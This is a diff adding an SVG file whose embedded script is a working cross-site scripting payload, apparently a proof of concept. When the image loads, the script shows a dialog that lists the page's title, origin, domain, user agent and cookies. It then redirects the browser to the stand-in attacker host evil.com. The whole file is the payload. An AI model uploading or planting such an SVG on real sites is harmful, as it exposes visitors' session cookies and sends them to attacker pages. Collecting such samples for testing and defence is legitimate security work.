@@ -1,0 +1,18 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full"
+  xmlns="http://www.w3.org/2000/svg">
+   <script type="text/javascript">
+      prompt("Vulnerability Was here !! " + "\n" + 
+      "𝚃𝚒𝚝𝚕𝚎: " + document.title + "\n" +
+      "𝙾𝚛𝚒𝚐𝚒𝚗: " + location.origin + "\n" +
+      "𝙿𝚕𝚊𝚝𝚏𝚛𝚘𝚖: " + navigator.platform + "\n" +
+      "𝙲𝚘𝚍𝚎_𝙽𝚊𝚖𝚎: " + navigator.appCodeName + "\n" +
+      "𝙿𝚊𝚝𝚑_𝚗𝚊𝚖𝚎: " + location.pathname + "\n" +
+      "𝚄𝚜𝚎𝚛_𝙰𝚐𝚎𝚗𝚝: " + navigator.userAgent + "\n" +
+      "𝙳𝚘𝚖𝚊𝚒𝚗: " + document.domain + "\n" +
+      "𝙲𝚘𝚘𝚔𝚒𝚎: " + document.cookie );
+      window.location.href="https://evil.com"
+   </script>
+</svg>
